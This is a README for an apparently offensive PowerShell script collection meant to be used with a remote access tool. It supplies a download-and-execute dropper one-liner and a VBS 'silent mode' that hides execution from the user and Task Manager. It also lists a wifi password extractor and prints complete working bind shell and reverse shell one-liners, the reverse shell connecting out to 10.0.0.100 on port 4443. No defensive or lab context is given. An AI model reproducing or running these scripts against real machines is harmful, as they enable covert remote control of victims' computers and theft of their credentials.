## The scripts provided are meant to be used in conjunction with a Remote Access Tool such as [hyp3r](https://github.com/XZE3N/hyp3r).

> You can use the following one-liner to execute the scripts on the target machine using a reverse shell such as the one provided by [hyp3r](https://github.com/XZE3N/hyp3r)
````powershell
#powerhsell dropper
(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('URL')|iex

````
## *Silent mode*

By leveraging certain Visual Basic commands and functionalities, all the scripts can be executed without displaying a window, effectively hiding them from the user.

All the scripts in this repository include a Silent Mode script (`.vbs`) written in Visual Basic. To run the PowerShell scripts in silent mode, download both the `.ps1` and `.vbs` files, then execute the `.vbs` script. This setup currently works well, as it doesnâ€™t appear in Task Manager or with the tasklist command. However, you can still terminate the task if needed, and the connection will be visible in netstat for both shells. I plan to streamline this process in the future!

  - ***wifiscr*** (Used for extracting wifi passwords on the target machine)

  - ***bindscr*** (Used for setting up a simple bind shell on the target machine)

#### One-Liner version for bind shell:

````powershell

$listener = [System.Net.Sockets.TcpListener]443;$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()


````

  - ***revscr*** (Used for setting up an interactive reverse shell on the target machine)

#### Powershell reverse shell one-liner by Nikhil SamratAshok Mittal @samratashok 

````powerhsell

$client = New-Object System.Net.Sockets.TCPClient('10.0.0.100',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
